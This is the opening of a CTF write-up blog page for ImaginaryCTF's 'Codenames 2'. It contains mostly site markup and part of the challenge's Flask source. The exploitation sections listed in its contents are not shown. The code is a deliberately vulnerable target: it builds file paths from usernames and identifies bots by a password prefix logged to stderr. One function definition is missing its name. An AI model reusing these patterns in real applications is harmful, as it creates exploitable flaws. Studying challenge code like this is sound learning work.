<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  <script src="/assets/js/mermaid.min.js"></script>
  <script src="/assets/js/panzoom.min.js"></script>
  <link rel="stylesheet" href="/assets/css/mermaid.css"><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="ImaginaryCTF - Codenames 2" />
<meta name="author" content="Anas" />
<meta property="og:locale" content="en" />
<meta name="description" content="Introduction Description Source code Exploitation Goal Confirm XSS Exploit CSWSH Crafting the payload Using the payload Get the Flag" />
<meta property="og:description" content="Introduction Description Source code Exploitation Goal Confirm XSS Exploit CSWSH Crafting the payload Using the payload Get the Flag" />
<link rel="canonical" href="http://localhost:4000/posts/imaginaryctf-2025-codenames-2/" />
<meta property="og:url" content="http://localhost:4000/posts/imaginaryctf-2025-codenames-2/" />
<meta property="og:site_name" content="NullBrunk" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-09-06T16:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="ImaginaryCTF - Codenames 2" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-09-06T16:00:00+00:00","datePublished":"2025-09-06T16:00:00+00:00","description":"Introduction Description Source code Exploitation Goal Confirm XSS Exploit CSWSH Crafting the payload Using the payload Get the Flag","headline":"ImaginaryCTF - Codenames 2","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/imaginaryctf-2025-codenames-2/"},"url":"http://localhost:4000/posts/imaginaryctf-2025-codenames-2/"}</script>
<!-- End Jekyll SEO tag -->


  <title>ImaginaryCTF - Codenames 2 | NullBrunk
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="NullBrunk">
<meta name="application-name" content="NullBrunk">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->


  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/logo.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">NullBrunk</a>
    <p class="site-subtitle fst-italic mb-0">Web pentester, CTF player.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
          
          <li class="nav-item">
            <a href="/ctfs/" class="nav-link">
              <i class="fa-fw fas fa-flag"></i>
              

              <span>CTFS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tools/" class="nav-link">
              <i class="fa-fw fas fas fa-code"></i>
              

              <span>TOOLS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              

              <span>TAGS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/resume/" class="nav-link">
              <i class="fa-fw fas fa-file"></i>
              

              <span>RESUME</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              

              <span>ABOUT</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
        
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap justify-content-center align-items-center w-100">
    <a href="https://ctftime.org/user/157452" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fa-regular fa-font-awesome"></i>
    </a>

    <a href="https://www.root-me.org/NullBrunk" aria-label="rootme" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-skull"></i>
    </a>

    <a href="https://github.com/nullbrunk" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fab fa-github"></i>
    </a>

    <a href="https://tryhackme.com/p/nullbrunk" aria-label="tryhackme" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-cloud"></i>
    </a>

    <a href="mailto:anas.idiri.pro@gmail.com" aria-label="mail" target="_blank" rel="noopener noreferrer">
      <i class="fa-solid fa-envelope"></i>
    </a>
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!--  include topbar.html lang=lang -->

        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11   col-xl-9  px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  




<!-- return -->










<header id="topbar-wrapper" aria-label="Top Bar">
    <div id="topbar" class="d-flex align-items-center justify-content-between h-100" >
        <nav id="breadcrumb" aria-label="Breadcrumb">
            <span><a href="/">Home</a></span>
             

            
                <span>
                 <a href="/categories/writeups/">Writeups</a>
                </span>
            
                <span>
                 <a href="/categories/ctftime2025/">CTFTime2025</a>
                </span>
            
                <span>
                 <a href="/categories/imaginaryctf/">ImaginaryCTF</a>
                </span>
            

             
             
            

            
             
            
            <span>ImaginaryCTF - Codenames 2</span>
        </nav>
    </div>
</header>

<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>ImaginaryCTF - Codenames 2</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1757174400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Sep  6, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/NullBrunk/">Anas</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2645 words"
>
  <em>14 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">ImaginaryCTF - Codenames 2</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">ImaginaryCTF - Codenames 2</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <ol>
  <li>Introduction
    <ul>
      <li><a href="#description">Description</a></li>
      <li><a href="#source-code">Source code</a></li>
    </ul>
  </li>
  <li>Exploitation
    <ul>
      <li><a href="#goal">Goal</a></li>
      <li><a href="#confirm-xss">Confirm XSS</a></li>
      <li><a href="#exploit-cswsh">Exploit CSWSH</a>
        <ul>
          <li><a href="#crafting-the-payload">Crafting the payload</a></li>
          <li><a href="#using-the-payload">Using the payload</a></li>
        </ul>
      </li>
      <li><a href="#get-the-flag">Get the Flag</a></li>
    </ul>
  </li>
</ol>

<hr />

<h1 id="introduction">Introduction</h1>

<h3 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<blockquote>
  <p>Codenames is no fun when your teammate sucks… Flag is in the environment variable FLAG_2, and please don’t spawn a lot of bots on remote. Test locally first.</p>
</blockquote>

<blockquote>
  <p>Solves: 28</p>
</blockquote>

<h3 id="source-code"><span class="me-2">Source code</span><a href="#source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<details id="dockerfiledb">
  <summary>app.py</summary>

  <div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">flash</span>
<span class="kn">from</span> <span class="n">flask_socketio</span> <span class="kn">import</span> <span class="n">SocketIO</span><span class="p">,</span> <span class="n">join_room</span><span class="p">,</span> <span class="n">emit</span>
<span class="kn">from</span> <span class="n">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span><span class="p">,</span> <span class="n">check_password_hash</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="sh">'</span><span class="s">static</span><span class="sh">'</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="sh">'</span><span class="s">templates</span><span class="sh">'</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SECRET_KEY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">SECRET_KEY</span><span class="sh">'</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>

<span class="n">socketio</span> <span class="o">=</span> <span class="nc">SocketIO</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

<span class="c1"># Secret prefix used to identify bot passwords; generated at startup
</span><span class="n">BOT_SECRET_PREFIX</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SECRET </span><span class="sh">"</span> <span class="o">+</span> <span class="n">BOT_SECRET_PREFIX</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>

<span class="n">PROFILES_DIR</span> <span class="o">=</span> <span class="sh">'</span><span class="s">profiles</span><span class="sh">'</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">PROFILES_DIR</span><span class="p">):</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">PROFILES_DIR</span><span class="p">)</span>

<span class="n">games</span> <span class="o">=</span> <span class="p">{}</span>
<span class="c1"># Directory for language wordlists
</span><span class="n">WORDS_DIR</span> <span class="o">=</span> <span class="sh">'</span><span class="s">words</span><span class="sh">'</span>
<span class="c1"># Ensure the words directory exists
</span><span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">WORDS_DIR</span><span class="p">):</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">WORDS_DIR</span><span class="p">)</span>
<span class="c1"># Available languages (filenames without extension)
</span><span class="n">LANGUAGES</span> <span class="o">=</span> <span class="p">[</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">splitext</span><span class="p">(</span><span class="n">f</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="nf">sorted</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">listdir</span><span class="p">(</span><span class="n">WORDS_DIR</span><span class="p">))</span> <span class="k">if</span> <span class="n">f</span><span class="p">.</span><span class="nf">lower</span><span class="p">().</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">.txt</span><span class="sh">'</span><span class="p">)]</span>

<span class="k">def</span> <span class="nf">load_profile</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">PROFILES_DIR</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Loading profile </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">f</span> <span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>

<span class="k">def</span> <span class="err">(</span><span class="nf">profile</span><span class="p">):</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">PROFILES_DIR</span><span class="p">,</span> <span class="n">profile</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Saving profile </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>

    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
        <span class="n">json</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">profile</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/register</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">register.html</span><span class="sh">'</span><span class="p">)</span>
    <span class="c1"># get form inputs
</span>    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">strip</span><span class="p">().</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
    <span class="n">raw_pass</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">raw_pass</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Password must be at least 8 characters</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">register</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">raw_pass</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Username and password required</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">register</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="nf">load_profile</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Username already exists</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">register</span><span class="sh">'</span><span class="p">))</span>
    <span class="c1"># detect bot via secret prefix in password
</span>    <span class="n">is_bot</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">pwd</span> <span class="o">=</span> <span class="n">raw_pass</span>
    <span class="k">if</span> <span class="n">raw_pass</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="n">BOT_SECRET_PREFIX</span><span class="p">):</span>
        <span class="n">is_bot</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="n">pwd</span> <span class="o">=</span> <span class="n">raw_pass</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">BOT_SECRET_PREFIX</span><span class="p">):]</span>
    <span class="c1"># hash stripped password
</span>    <span class="n">pw_hash</span> <span class="o">=</span> <span class="nf">generate_password_hash</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
